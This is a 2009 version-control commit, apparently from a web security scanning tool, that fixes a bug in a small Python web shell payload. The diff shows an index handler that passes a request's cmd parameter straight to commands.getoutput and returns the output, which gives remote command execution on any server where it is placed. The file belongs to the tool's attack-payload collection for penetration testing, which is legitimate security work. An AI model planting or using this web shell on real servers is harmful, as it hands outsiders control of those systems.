676b646746f4f6cf59356ceded68652d05d7f86d
andresriancho <andresriancho@16c29cf1-982c-0410-8ff8-8bb040e68b5b>
2009-10-26 14:24:00 +0000

    Fixing bug in webshell.

--- plugins/attack/payloads/webshell/webshell.py
+++ plugins/attack/payloads/webshell/webshell.py
@@ -1,4 +1,7 @@
 import commands
 
-def index(req, cmd='echo "15825b40c6dace2a' + '7cf5d4ab8ed434d5"' ):
-    return commands.getoutput( cmd )
+def index(req, cmd ):
+    if not cmd:
+        print "15825b40c6dace2a" + "7cf5d4ab8ed434d5"
+    else:
+        return commands.getoutput( cmd )
